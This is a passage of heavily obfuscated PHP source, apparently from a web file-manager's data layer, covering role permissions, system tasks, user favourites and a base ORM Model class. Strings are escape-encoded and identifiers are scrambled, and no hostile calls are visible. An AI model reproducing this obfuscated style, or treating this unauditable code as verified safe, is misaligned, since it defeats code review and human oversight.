"\141\144\155\151\156\151\163\164\162\141\x74\x6f\162", "\x73\x6f\162\x74"); public function listData($èØëæòÔ = false, $š÷úßÕä = "\x73\x6f\x72\164", $Ñöº»ëÒ = false) { $É¤ÍÆ¨‹ =& $_SERVER[¯‘·½]; $ºú²ù¯ = parent::listData($èØëæòÔ, $š÷úßÕä, $Ñöº»ëÒ); if (!$èØëæòÔ) { foreach ($ºú²ù¯ as $õğÖ±Ä­ => $ÍÜ­Á“ş) { if ($ÍÜ­Á“ş[$É¤ÍÆ¨‹[2218]] == 1) { $ºú²ù¯[$õğÖ±Ä­][$É¤ÍÆ¨‹[528]] = LNG($É¤ÍÆ¨‹[2494]); } } } return $ºú²ù¯; } public function update($¶¡ÊìğŠ, $ıÇ£¹ï) { $õ‚ö§í• =& $_SERVER[¯‘·½]; $â‘ß¾Î½ = parent::listData($¶¡ÊìğŠ); $»Ğ¼ñ¦  = $this->findByName($ıÇ£¹ï[$õ‚ö§í•[32]]); if (!$â‘ß¾Î½ || $»Ğ¼ñ¦  && $»Ğ¼ñ¦ [$õ‚ö§í•[477]] != $â‘ß¾Î½[$õ‚ö§í•[477]]) { return !1; } if ($»Ğ¼ñ¦ [$õ‚ö§í•[2218]] == 1) { $ıÇ£¹ï = array($õ‚ö§í•[32] => $ıÇ£¹ï[$õ‚ö§í•[32]], $õ‚ö§í•[2029] => $ıÇ£¹ï[$õ‚ö§í•[2029]]); } $this->filterAuth($ıÇ£¹ï[$õ‚ö§í•[489]]); return parent::update($¶¡ÊìğŠ, $ıÇ£¹ï); } public function remove($Åø¨®¿) { $©şçŠ´ë = parent::listData($Åø¨®¿); if (!$©şçŠ´ë || $©şçŠ´ë[$_SERVER[¯‘·½][192]]) { return !1; } return parent::remove($Åø¨®¿); } public function add($ı¨º—º‘) { $’‘“ÖÜ© =& $_SERVER[¯‘·½]; $úƒàîëî = $ı¨º—º‘[$’‘“ÖÜ©[32]]; if ($this->findByName($úƒàîëî)) { return !1; } $¸‹õ­èè = array($’‘“ÖÜ©[496] => $úƒàîëî, $’‘“ÖÜ©[2012] => $’‘“ÖÜ©[12], $’‘“ÖÜ©[2008] => $’‘“ÖÜ©[2016], $’‘“ÖÜ©[2495] => 1, $’‘“ÖÜ©[2011] => 0, $’‘“ÖÜ©[2496] => 0, $’‘“ÖÜ©[2010] => $this->getSort()); $ı¨º—º‘ = array_merge($¸‹õ­èè, $ı¨º—º‘); $this->filterAuth($ı¨º—º‘[$’‘“ÖÜ©[489]]); return parent::insert($ı¨º—º‘); } private function getSort() { $Â×®üı™ =& $_SERVER[¯‘·½]; $«¢»ÌÜ² = parent::listData(); $Ö“øšşÜ = array_to_keyvalue($«¢»ÌÜ², $Â×®üı™[12], $Â×®üı™[2030]); return empty($Ö“øšşÜ) ? 0 : max($Ö“øšşÜ) + 1; } private function filterAuth(&$¼îÇ‚˜) { $ñµøˆË¾ =& $_SERVER[¯‘·½]; $Êƒ±äÆ– = array(); $‡ú€¨´ç = array_filter(explode($ñµøˆË¾[50], $¼îÇ‚˜)); foreach ($‡ú€¨´ç as $¼îÇ‚˜) { $¬Úò¡²¤ = explode($ñµøˆË¾[10], $¼îÇ‚˜); if ($¬Úò¡²¤[0] == $ñµøˆË¾[2497] && $¬Úò¡²¤[1] != $ñµøˆË¾[1299]) { $¬Šìãùã = $¬Úò¡²¤[0] . $ñµøˆË¾[10] . $¬Úò¡²¤[1] . $ñµøˆË¾[2498]; if (!in_array($¬Šìãùã, $‡ú€¨´ç)) { $Êƒ±äÆ–[] = $¬Šìãùã; } } $Êƒ±äÆ–[] = $¼îÇ‚˜; } $¼îÇ‚˜ = implode($ñµøˆË¾[50], $Êƒ±äÆ–); } public function findRoleDefault() { $‰µ±ÁÓ» =& $_SERVER[¯‘·½]; $ò’è„Úá = parent::listData(); $Áãš¡µ… = !1; foreach ($ò’è„Úá as $ÀıôÂ¡) { if (!$ÀıôÂ¡ || $ÀıôÂ¡[$‰µ±ÁÓ»[2028]] == $‰µ±ÁÓ»[231] || $ÀıôÂ¡[$‰µ±ÁÓ»[2218]] == 1) { continue; } if (strstr($ÀıôÂ¡[$‰µ±ÁÓ»[489]], $‰µ±ÁÓ»[2499])) { continue; } if (!strstr($ÀıôÂ¡[$‰µ±ÁÓ»[489]], $‰µ±ÁÓ»[2500])) { continue; } if (!$Áãš¡µ…) { $Áãš¡µ… = $ÀıôÂ¡; continue; } $¿øŒ¨å = explode($‰µ±ÁÓ»[50], $Áãš¡µ…[$‰µ±ÁÓ»[489]]); $Ìˆøø‚ó = explode($‰µ±ÁÓ»[50], $ÀıôÂ¡[$‰µ±ÁÓ»[489]]); if (count($¿øŒ¨å) > count($Ìˆøø‚ó)) { $Áãš¡µ… = $ÀıôÂ¡; } } return $Áãš¡µ… ? $Áãš¡µ…[$‰µ±ÁÓ»[477]] : $‰µ±ÁÓ»[12]; } public function sort($àø¨‰Œ’, $‹Ñ‰Ü¡) { return parent::update($àø¨‰Œ’, $‹Ñ‰Ü¡); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\x74\x61\163\153\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x74\x79\160\145", "\145\x76\x65\156\x74", "\x74\x69\x6d\x65", "\144\145\163\x63", "\163\171\163\164\145\155", "\145\x6e\141\142\154\145", "\x6c\x61\x73\x74\122\x75\156", "\x73\157\x72\164"); public function listData($•ïËÉæÈ = false, $ß÷ğº¢– = "\163\157\x72\x74", $ø¥ÆñÑÅ = false) { return parent::listData($•ïËÉæÈ, $ß÷ğº¢–, $ø¥ÆñÑÅ); } public function add($›Çä¶²ê) { $øáÙ¶Å  =& $_SERVER[¯‘·½]; $¼˜áÈà² = $this->findByName($›Çä¶²ê[$øáÙ¶Å [32]]); if ($¼˜áÈà²) { return !1; } $›Çä¶²ê[$øáÙ¶Å [1756]] = 0; $›Çä¶²ê[$øáÙ¶Å [2030]] = $this->getSort(); return parent::insert($›Çä¶²ê); } private function getSort() { $Â¸ÜÅ‘½ =& $_SERVER[¯‘·½]; $¡éÕ§¶£ = parent::listData(); $’Šëé”Õ = array_to_keyvalue($¡éÕ§¶£, $Â¸ÜÅ‘½[12], $Â¸ÜÅ‘½[2030]); return empty($’Šëé”Õ) ? 0 : max($’Šëé”Õ) + 1; } public function update($¾ïĞÌ¿, $š¯îÇòÕ) { $—İ™èœÂ =& $_SERVER[¯‘·½]; $ŠœÔˆ‘¸ = $this->listData($¾ïĞÌ¿); $ÔÛÆêñ = $this->findByName($š¯îÇòÕ[$—İ™èœÂ[32]]); if (!$ŠœÔˆ‘¸ || $ÔÛÆêñ && $ÔÛÆêñ[$—İ™èœÂ[477]] != $ŠœÔˆ‘¸[$—İ™èœÂ[477]]) { return !1; } return parent::update($¾ïĞÌ¿, $š¯îÇòÕ); } public function remove($Êª¤ª¿á, $³©ÈÎ±Ã = false) { $‘¶»îÇÑ =& $_SERVER[¯‘·½]; $±¢€ÏœŞ = $this->listData($Êª¤ª¿á); if (!$±¢€ÏœŞ) { return; } if (!$³©ÈÎ±Ã && $±¢€ÏœŞ[$‘¶»îÇÑ[192]] == $‘¶»îÇÑ[91]) { return !1; } return parent::remove($Êª¤ª¿á); } public function enable($•–¨æç, $†®ŒÊäÖ) { return $this->update($•–¨æç, array($_SERVER[¯‘·½][2489] => $†®ŒÊäÖ)); } public function run($‡’Òõéâ) { return $this->update($‡’Òõéâ, array($_SERVER[¯‘·½][2501] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($¤¥»‹Õè) { $ı—µ³øÛ =& $_SERVER[¯‘·½]; return array($ı—µ³øÛ[2122] => array(USER_ID, $ı—µ³øÛ[2502])); } protected function listData() { $¶÷œ¹í =& $_SERVER[¯‘·½]; $ø•²¬ÜÃ = array($¶÷œ¹í[1797] => USER_ID, $¶÷œ¹í[561] => 0); $¯ˆùëƒµ = $¶÷œ¹í[2503]; $²Ğ·ÎÍ = $this->field($¯ˆùëƒµ)->where($ø•²¬ÜÃ)->order($¶÷œ¹í[2504])->select(); return $²Ğ·ÎÍ ? $²Ğ·ÎÍ : array(); } protected function resetCache() { } protected function listView() { $şæûÆÁç =& $_SERVER[¯‘·½]; $ùÄ¨Š = $this->listData(); $…¶ˆµµ = array_filter_by_field($ùÄ¨Š, $şæûÆÁç[33], $şæûÆÁç[492]); $Î¦îŸ»÷ = array_to_keyvalue($…¶ˆµµ, $şæûÆÁç[12], $şæûÆÁç[87]); if (!$Î¦îŸ»÷) { return $ùÄ¨Š; } $òºÄ«† = 2000; $äì‘ÌÕ¯ = array($şæûÆÁç[493] => array($şæûÆÁç[494], $Î¦îŸ»÷)); $›¥µàÙí = Model($şæûÆÁç[916])->listSource($äì‘ÌÕ¯, $òºÄ«†); $›¥µàÙí = array_merge($›¥µàÙí[$şæûÆÁç[86]], $›¥µàÙí[$şæûÆÁç[85]]); $›¥µàÙí = array_to_keyvalue($›¥µàÙí, $şæûÆÁç[194]); foreach ($ùÄ¨Š as $ä³¤«øˆ => $—îÍÂŞß) { $ˆŒ•²Áù = $›¥µàÙí[$—îÍÂŞß[$şæûÆÁç[87]]]; $ˆŒ•²Áù = $ˆŒ•²Áù ? $ˆŒ•²Áù : array(); $ùÄ¨Š[$ä³¤«øˆ] = array_merge($ˆŒ•²Áù, $—îÍÂŞß); } return $ùÄ¨Š; } protected function addFav($…†»à¸, $Çş¶ß„ = '', $†ûŒÊÎÚ = "\x73\157\x75\x72\x63\x65") { $Ş¥öó«¢ =& $_SERVER[¯‘·½]; $‘·çÙæÚ = array($Ş¥öó«¢[1797] => USER_ID, $Ş¥öó«¢[561] => 0, $Ş¥öó«¢[498] => $†ûŒÊÎÚ, $Ş¥öó«¢[497] => $…†»à¸); if ($this->where($‘·çÙæÚ)->find()) { return !1; } $‘·çÙæÚ = array($Ş¥öó«¢[1797] => USER_ID, $Ş¥öó«¢[561] => 0); $‚İİ€Ò· = $this->where($‘·çÙæÚ)->max($Ş¥öó«¢[2030]); if (!$‚İİ€Ò·) { $‚İİ€Ò· = 0; } if (!$Çş¶ß„ && $†ûŒÊÎÚ == $Ş¥öó«¢[492]) { $†ş¦çâî = Model($Ş¥öó«¢[1452])->where(array($Ş¥öó«¢[493] => $…†»à¸))->find(); if (!$†ş¦çâî) { return !1; } $Çş¶ß„ = $†ş¦çâî[$Ş¥öó«¢[32]]; } $Çş¶ß„ = $this->getAutoName($Çş¶ß„); $™Ô Â¹° = array($Ş¥öó«¢[1797] => USER_ID, $Ş¥öó«¢[561] => 0, $Ş¥öó«¢[496] => $Çş¶ß„, $Ş¥öó«¢[497] => $…†»à¸, $Ş¥öó«¢[498] => $†ûŒÊÎÚ, $Ş¥öó«¢[2010] => $‚İİ€Ò· + 1); return $this->add($™Ô Â¹°); } protected function remove($‰í©æ£¥) { $ä®à·¶É =& $_SERVER[¯‘·½]; $ÛšÇìØ = array($ä®à·¶É[1797] => USER_ID, $ä®à·¶É[495] => $‰í©æ£¥); return $this->where($ÛšÇìØ)->delete(); } protected function removeByName($ç¦«¢Ù) { $±ÅóãüÜ =& $_SERVER[¯‘·½]; $£¶Â®ô = array($±ÅóãüÜ[1797] => USER_ID, $±ÅóãüÜ[496] => $ç¦«¢Ù, $±ÅóãüÜ[561] => 0); return $this->where($£¶Â®ô)->delete(); } protected function rename($ğ³‚œ¥, $í÷ºü†ó) { $õ³úé‹ =& $_SERVER[¯‘·½]; if ($ğ³‚œ¥ == $í÷ºü†ó) { return !1; } $İÁÂ¹Ñ = $this->getAutoName($í÷ºü†ó); if ($í÷ºü†ó != $İÁÂ¹Ñ) { return !1; } $Î¯­·ßİ = array($õ³úé‹[1797] => USER_ID, $õ³úé‹[561] => 0, $õ³úé‹[32] => $ğ³‚œ¥); return $this->where($Î¯­·ßİ)->save(array($õ³úé‹[32] => $í÷ºü†ó)); } protected function resetSort($ØÕâ»È×) { $¿ïª°Ò =& $_SERVER[¯‘·½]; $ØÕâ»È× = is_array($ØÕâ»È×) ? $ØÕâ»È× : array(); $ƒ•£—êÀ = array($¿ïª°Ò[1797] => USER_ID); for ($Õ½Ûó˜Ë = 0; $Õ½Ûó˜Ë < count($ØÕâ»È×); $Õ½Ûó˜Ë++) { $ƒ•£—êÀ[$¿ïª°Ò[495]] = $ØÕâ»È×[$Õ½Ûó˜Ë]; $this->where($ƒ•£—êÀ)->save(array($¿ïª°Ò[2010] => $Õ½Ûó˜Ë + 1)); } return !0; } protected function moveTop($˜¿ÏˆèÕ) { $¨úµ½Ëı =& $_SERVER[¯‘·½]; $ë‚Œòéô = array($¨úµ½Ëı[1797] => USER_ID, $¨úµ½Ëı[561] => 0); $±å“¼° = $this->where($ë‚Œòéô)->where(array($¨úµ½Ëı[32] => $˜¿ÏˆèÕ))->find(); if (!$±å“¼°) { return; } $ªšœï = $this->field($¨úµ½Ëı[477])->where($ë‚Œòéô)->order($¨úµ½Ëı[2504])->select(); $ªšœï = array_to_keyvalue($ªšœï, $¨úµ½Ëı[12], $¨úµ½Ëı[477]); $·ªôô­™ = $ªšœï; $ªšœï = array_remove_value($ªšœï, $±å“¼°[$¨úµ½Ëı[477]]); array_unshift($ªšœï, $±å“¼°[$¨úµ½Ëı[477]]); return $this->resetSort($ªšœï); } protected function moveBottom($Å”÷ÜšÚ) { $ŸŸ‘¤Ò =& $_SERVER[¯‘·½]; $Ùï‹ŒÎƒ = array($ŸŸ‘¤Ò[1797] => USER_ID, $ŸŸ‘¤Ò[561] => 0); $İÆÑÎŒş = $this->where($Ùï‹ŒÎƒ)->max($ŸŸ‘¤Ò[2030]); $‘¼šöÚ = array($ŸŸ‘¤Ò[2030] => $İÆÑÎŒş + 1); return $this->where($Ùï‹ŒÎƒ)->where(array($ŸŸ‘¤Ò[32] => $Å”÷ÜšÚ))->save($‘¼šöÚ); } private function getAutoName($£¡¼Ûò¶) { $›Ø´©·ˆ =& $_SERVER[¯‘·½]; $îˆÍı“† = array($›Ø´©·ˆ[1797] => USER_ID, $›Ø´©·ˆ[561] => 0); $¸Ù¹ß¸ç = $this->field($›Ø´©·ˆ[32])->where($îˆÍı“†)->select(); $¸Ù¹ß¸ç = array_to_keyvalue($¸Ù¹ß¸ç, $›Ø´©·ˆ[12], $›Ø´©·ˆ[32]); if (!$¸Ù¹ß¸ç || !in_array($£¡¼Ûò¶, $¸Ù¹ß¸ç)) { return $£¡¼Ûò¶; } for ($•·×œ¡Ï = 0; $•·×œ¡Ï < count($¸Ù¹ß¸ç); $•·×œ¡Ï++) { if (!in_array($£¡¼Ûò¶ . "\50{$•·×œ¡Ï}\51", $¸Ù¹ß¸ç)) { return $£¡¼Ûò¶ . "\50{$•·×œ¡Ï}\x29"; } } return $£¡¼Ûò¶ . "\50{$•·×œ¡Ï}\x29"; } } goto DÆË±âéäõ; e‚¾æÂˆŠĞ: define($_SERVER[¯‘·½][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\157\162\x64\145\x72", "\141\154\151\141\x73", "\x68\x61\x76\151\x6e\x67", "\x67\162\x6f\165\160", "\154\x6f\143\x6b", "\x64\151\x73\164\x69\156\x63\x74", "\141\x75\164\x6f", "\x66\151\154\x74\145\x72", "\x76\x61\x6c\151\144\x61\164\x65", "\x72\x65\163\x75\154\x74", "\x62\151\156\144", "\164\x6f\153\x65\156"); public function __construct($«®™Ó­Š = '', $»íô‚ = '', $òÕÃÚ× = '') { $ùæØÕ× =& $_SERVER[¯‘·½]; $this->_initialize(); if (!empty($«®™Ó­Š)) { if (strpos($«®™Ó­Š, $ùæØÕ×[10])) { list($this->dbName, $this->name) = explode($ùæØÕ×[10], $«®™Ó­Š); } else { $this->name = $«®™Ó­Š; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($»íô‚)) { $this->tablePrefix = $ùæØÕ×[12]; } elseif ($ùæØÕ×[12] != $»íô‚) { $this->tablePrefix = $»íô‚; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ùæØÕ×[324]); } $this->db(0, empty($this->connection) ? $òÕÃÚ× : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÔÛ­Ü‰Ä =& $_SERVER[¯‘·½]; if (empty($this->fields)) { if (think_config($ÔÛ­Ü‰Ä[325])) { $¿…Òê¢ = $this->dbName ? $this->dbName : think_config($ÔÛ­Ü‰Ä[326]); $ºêÒ˜Ÿ· = think_var_cache($ÔÛ­Ü‰Ä[327] . strtolower(get_path_this($¿…Òê¢) . $ÔÛ­Ü‰Ä[10] . $this->name)); if ($ºêÒ˜Ÿ·) { $®Ö’šÁ½ = think_config($ÔÛ­Ü‰Ä[328]); if (empty($®Ö’šÁ½) || $ºêÒ˜Ÿ·[$ÔÛ­Ü‰Ä[329]] == $®Ö’šÁ½) { $this->fields = $ºêÒ˜Ÿ·; return; } } } $this->flush(); } } public function flush() { $ è¿á€ö =& $_SERVER[¯‘·½]; $this->db->setModel($this->name); $§¦¼Ö¶ñ = $this->db->getFields($this->getTableName()); if (!$§¦¼Ö¶ñ) { return !1; } $this->fields = array_keys($§¦¼Ö¶ñ); $this->fields[$ è¿á€ö[330]] = !1; foreach ($§¦¼Ö¶ñ as $ü™”‰¦ì => $óÑ£Ïªˆ) { $ˆÄŸäºÎ[$ü™”‰¦ì] = $óÑ£Ïªˆ[$ è¿á€ö[33]]; if ($óÑ£Ïªˆ[$ è¿á€ö[39]]) { $this->fields[$ è¿á€ö[331]] = $ü™”‰¦ì; if ($óÑ£Ïªˆ[$ è¿á€ö[42]]) { $this->fields[$ è¿á€ö[330]] = !0; } } } $this->fields[$ è¿á€ö[332]] = $ˆÄŸäºÎ; if (think_config($ è¿á€ö[328])) { $this->fields[$ è¿á€ö[329]] = think_config($ è¿á€ö[328]); } if (think_config($ è¿á€ö[325])) { $Ğƒø¤™§ = $this->dbName ? $this->dbName : think_config($ è¿á€ö[326]); think_var_cache($ è¿á€ö[327] . strtolower(get_path_this($Ğƒø¤™§) . $ è¿á€ö[10] . $this->name), $this->fields); } } public function switchModel($è…©ª­¢, $£œá´ó = array()) { $Ü°Òùê¯ =& $_SERVER[¯‘·½]; $³éïÈ¡ = ucwords(strtolower($è…©ª­¢)) . $Ü°Òùê¯[333]; if (!class_exists($³éïÈ¡)) { think_exception($³éïÈ¡ . think_lang($Ü°Òùê¯[334])); } $this->_extModel = new $³éïÈ¡($this->name); if (!empty($£œá´ó)) { foreach ($£œá´ó as $¿£Ñ¾) { $this->_extModel->setProperty($¿£Ñ¾, $this->{$¿£Ñ¾}); } } return $this->_extModel; } public function __set($Ôî¯¤Îì, $‘¡ğ¾®ü) { $this->data[$Ôî¯¤Îì] = $‘¡ğ¾®ü; } public function __get($Ö®ÂÃÃÎ) { return isset($this->data[$Ö®ÂÃÃÎ]) ? $this->data[$Ö®ÂÃÃÎ] : null; } public function __isset($Ô¡·ˆ­×) { return isset($this->data[$Ô¡·ˆ­×]); } public function __unset($Ì¡Á×¼½) { unset($this->data[$Ì¡Á×¼½]); } public function __call($Áò–…†‹, $ë×¹ßê…) { $ã™ªÜÄĞ =& $_SERVER[¯‘·½]; if (in_array(strtolower($Áò–…†‹), $this->methods, !0)) { $this->options[strtolower($Áò–…†‹)] = $ë×¹ßê…[0]; return $this; } elseif (in_array(strtolower($Áò–…†‹), array($ã™ªÜÄĞ[335], $ã™ªÜÄĞ[336], $ã™ªÜÄĞ[337], $ã™ªÜÄĞ[338], $ã™ªÜÄĞ[339]), !0)) { $½Ÿš­Ë¾ = isset($ë×¹ßê…[0]) ? $ë×¹ßê…[0] : $ã™ªÜÄĞ[223]; $½Ÿš­Ë¾ = $this->db->parseKey($½Ÿš­Ë¾); return $this->getField(strtoupper($Áò–…†‹) . $ã™ªÜÄĞ[340] . $½Ÿš­Ë¾ . $ã™ªÜÄĞ[341] . $Áò–…†‹, $ã™ªÜÄĞ[335]); } elseif (strtolower(substr($Áò–…†‹, 0, 5)) == $ã™ªÜÄĞ[342]) { $½Ÿš­Ë¾ = think_parse_name(substr($Áò–…†‹, 5)); $ì±Ø¯´é[$½Ÿš­Ë¾] = $ë×¹ßê…[0]; return $this->where($ì±Ø¯´é)->find(); } elseif (strtolower(substr($Áò–…†‹, 0, 10)) == $ã™ªÜÄĞ[343]) { $•ı¿¶ñ„ = think_parse_name(substr($Áò–…†‹, 10)); $ì±Ø¯´é[$•ı¿¶ñ„] = $ë×¹ßê…[0]; return $this->where($ì±Ø¯´é)->getField($ë×¹ßê…[1]); } elseif (isset($this->_scope[$Áò–…†‹])) { return $this->scope($Áò–…†‹, $ë×¹ßê…[0]); } elseif (method_exists($this, $Áò–…†‹)) { array_unshift($ë×¹ßê…, $Áò–…†‹); return call_user_func_array(array($this, $ã™ªÜÄĞ[344]), $ë×¹ßê…); } else { return call_user_func_array(array(parent, $Áò–…†‹), $ë×¹ßê…); } } protected function call() { $şĞò²«ã =& $_SERVER[¯‘·½]; $‡€æé÷ = func_get_args(); $¶°Î—¡ú = array_shift($‡€æé÷); $ŸÌú´˜ = $¶°Î—¡ú; if (is_array($¶°Î—¡ú)) { $ŸÌú´˜ = $¶°Î—¡ú[1]; $¶°Î—¡ú = $¶°Î—¡ú[0]; } $ÔÉÍôæè = count($‡€æé÷) - 1; if (isset($‡€æé÷[$ÔÉÍôæè]) && $‡€æé÷[$ÔÉÍôæè] === $¶°Î—¡ú) { think_exception(__CLASS__ . $şĞò²«ã[4] . $¶°Î—¡ú . think_lang($şĞò²«ã[345])); return; } $‡€æé÷[] = $¶°Î—¡ú; if (method_exists($this, $şĞò²«ã[346])) { $ñï²Ô×¼ = call_user_func_array(array($this, $şĞò²«ã[347]), array($ŸÌú´˜, $‡€æé÷)); if (!is_null($ñï²Ô×¼) && $ñï²Ô×¼ !== !1) { return $ñï²Ô×¼; } } $Ê²å±õ» = call_user_func_array(array($this, $¶°Î—¡ú), $‡€æé÷); if (method_exists($this, $şĞò²«ã[348])) { $ñï²Ô×¼ = call_user_func_array(array($this, $şĞò²«ã[349]), array($ŸÌú´˜, $‡€æé÷, $Ê²å±õ»)); if ($ñï²Ô×¼) { return $ñï²Ô×¼; } } return $Ê²å±õ»; } protected function _initialize() { } protected function _facade($¯ê¦ìê¿) { $Ÿ©öóø“ =& $_SERVER[¯‘·½]; if (!empty($this->fields)) { foreach ($¯ê¦ìê¿ as $İÖ½¡®¹ => $·÷‰È±ı) { if (is_array($this->fields) && !in_array($İÖ½¡®¹, $this->fields, !0)) { unset($¯ê¦ìê¿[$İÖ½¡®¹]); } elseif (is_scalar($·÷‰È±ı)) { $this->_parseType($¯ê¦ìê¿, $İÖ½¡®¹); } } } if (!empty($this->options[$Ÿ©öóø“[350]])) { $¯ê¦ìê¿ = array_map($this->options[$Ÿ©öóø“[350]], $¯ê¦ìê¿); unset($this->options[$Ÿ©öóø“[350]]); } $this->_beforeWrite($¯ê¦ìê¿); return $¯ê¦ìê¿; } protected function _beforeWrite(&$ê™÷¦¶) { } public function add($†ú¬ˆüÎ = '', $ŒØ£ø¡Ø = array(), $ºûß‘æ = false) { if (empty($†ú¬ˆüÎ)) { if (!empty($this->data)) { $†ú¬ˆüÎ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¯‘·½][351]); return !1; } } $ŒØ£ø¡Ø = $this->_parseOptions($ŒØ£ø¡Ø); $†ú¬ˆüÎ = $this->_facade($†ú¬ˆüÎ); if (!1 === $this->_beforeInsert($†ú¬ˆüÎ, $ŒØ£ø¡Ø)) { return !1; } $‚¦õû½‹ = $this->db->insert($†ú¬ˆüÎ, $ŒØ£ø¡Ø, $ºûß‘æ); if (!1 !== $‚¦õû½‹) { $Ÿ™ü‹´¦ = $this->getLastInsID(); if ($Ÿ™ü‹´¦) { $†ú¬ˆüÎ[$this->getPk()] = $Ÿ™ü‹´¦; $this->_after_insert($†ú¬ˆüÎ, $ŒØ£ø¡Ø); return $Ÿ™ü‹´¦; } $this->_after_insert($†ú¬ˆüÎ, $ŒØ£ø¡Ø); } return $‚¦õû½‹; } protected function _beforeInsert(&$Øªû–° , $î¸¢à©º) { } protected function _after_insert($¦¤–¨¶Ç, $ãˆ¡óğà) { } public function addAll($º’Ş†×ï, $¾§â÷æ = array(), $ˆßÛ«‘ = false) { $òÙ­Ôñ´ =& $_SERVER[¯‘·½]; if (empty($º’Ş†×ï)) { $this->error = think_lang($òÙ­Ôñ´[351]); return !1; } $¾§â÷æ = $this->_parseOptions($¾§â÷æ); foreach ($º’Ş†×ï as $•¹€‹¢Ç => $ÉÂÌÊÍ³) { $º’Ş†×ï[$•¹€‹¢Ç] = $this->_facade($ÉÂÌÊÍ³); } if (method_exists($this->db, $òÙ­Ôñ´[352])) { $ôï€öí = $this->db->insertAll($º’Ş†×ï, $¾§â÷æ, $ˆßÛ«‘); } else { $this->startTrans(); foreach ($º’Ş†×ï as $•¹€‹¢Ç => $ÉÂÌÊÍ³) { $ôï€öí = $this->db->insert($ÉÂÌÊÍ³, $¾§â÷æ, $ˆßÛ«‘); } $this->commit(); } if (!1 !== $ôï€öí) { $¶ù„úÆ = $this->getLastInsID(); if ($¶ù„úÆ) { return $¶ù„úÆ; } } return $ôï€öí; } public function selectAdd($ÜáéÃ¯ = '', $æâì¯©½ = '', $ÔÁ—ô³„ = array()) { $­¼Ï„–Ë =& $_SERVER[¯‘·½]; $ÔÁ—ô³„ = $this->_parseOptions($ÔÁ—ô³„); if (!1 === ($ğ­ñ¥… = $this->db->selectInsert($ÜáéÃ¯ ? $ÜáéÃ¯ : $ÔÁ—ô³„[$­¼Ï„–Ë[353]], $æâì¯©½ ? $æâì¯©½ : $this->getTableName(), $ÔÁ—ô³„))) { $this->error = think_lang($­¼Ï„–Ë[354]); return !1; } else { return $ğ­ñ¥…; } } public function save($ˆÔ›Œı = '', $ĞÜÚİÊ… = array()) { $éÒ»…Ü¾ =& $_SERVER[¯‘·½]; if (empty($ˆÔ›Œı)) { if (!empty($this->data)) { $ˆÔ›Œı = $this->data; $this->data = array(); } else { $this->error = think_lang($éÒ»…Ü¾[351]); return !1; } } $ˆÔ›Œı = $this->_facade($ˆÔ›Œı); $ĞÜÚİÊ… = $this->_parseOptions($ĞÜÚİÊ…); $²Åƒ©º· = $this->getPk(); if (!isset($ĞÜÚİÊ…[$éÒ»…Ü¾[355]])) { if (isset($ˆÔ›Œı[$²Åƒ©º·])) { $¸š•»˜à[$²Åƒ©º·] = $ˆÔ›Œı[$²Åƒ©º·]; $ĞÜÚİÊ…[$éÒ»…Ü¾[355]] = $¸š•»˜à; unset($ˆÔ›Œı[$²Åƒ©º·]); } else { $this->error = think_lang($éÒ»…Ü¾[354]); return !1; } } if (is_array($ĞÜÚİÊ…[$éÒ»…Ü¾[355]]) && isset($ĞÜÚİÊ…[$éÒ»…Ü¾[355]][$²Åƒ©º·])) { $¹ˆ×­±Ş = $ĞÜÚİÊ…[$éÒ»…Ü¾[355]][$²Åƒ©º·]; } if (!1 === $this->_beforeUpdate($ˆÔ›Œı, $ĞÜÚİÊ…)) { return !1; } $ÂÁôÆÇ = $this->db->update($ˆÔ›Œı, $ĞÜÚİÊ…); if (!1 !== $ÂÁôÆÇ) { if (isset($¹ˆ×­±Ş)) { $ˆÔ›Œı[$²Åƒ©º·] = $¹ˆ×­±Ş; } $this->_afterUpdate($ˆÔ›Œı, $ĞÜÚİÊ…); } return $ÂÁôÆÇ; } protected function _beforeUpdate(&$¶Æãá¸, $ôº†üçË) { } protected function _afterUpdate($úıŠ¾ë, $ÑûÄ“ÆÍ) { } public function delete($ôĞË¸İ‰ = array()) { $ğÃ„‹ˆı =& $_SERVER[¯‘·½]; if (empty($ôĞË¸İ‰) && empty($this->options[$ğÃ„‹ˆı[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $‹ß±Ú±£ = $this->getPk(); if (is_numeric($ôĞË¸İ‰) || is_string($ôĞË¸İ‰)) { if (strpos($ôĞË¸İ‰, $ğÃ„‹ˆı[50])) { $¶ØÆõÑ·[$‹ß±Ú±£] = array($ğÃ„‹ˆı[356], $ôĞË¸İ‰); } else { $¶ØÆõÑ·[$‹ß±Ú±£] = $ôĞË¸İ‰; } $this->options[$ğÃ„‹ˆı[355]] = $¶ØÆõÑ·; } $ôĞË¸İ‰ = $this->_parseOptions(); if (is_array($ôĞË¸İ‰[$ğÃ„‹ˆı[355]]) && isset($ôĞË¸İ‰[$ğÃ„‹ˆı[355]][$‹ß±Ú±£])) { $“—éóÜ = $ôĞË¸İ‰[$ğÃ„‹ˆı[355]][$‹ß±Ú±£]; } $Ÿ§íàë = $this->db->delete($ôĞË¸İ‰); if (!1 !== $Ÿ§íàë) { $øáïªœÜ = array(); if (isset($“—éóÜ)) { $øáïªœÜ[$‹ß±Ú±£] = $“—éóÜ; } $this->_after_delete($øáïªœÜ, $ôĞË¸İ‰); } return $Ÿ§íàë; } protected function _after_delete($Â²Îí‰, $Ô“óğ±) { } public function select($éô—ÕÌÅ = array()) { $¬ºîŞÌÄ =& $_SERVER[¯‘·½]; if (is_string($éô—ÕÌÅ) || is_numeric($éô—ÕÌÅ)) { $Â¼—ò•ü = $this->getPk(); if (strpos($éô—ÕÌÅ, $¬ºîŞÌÄ[50])) { 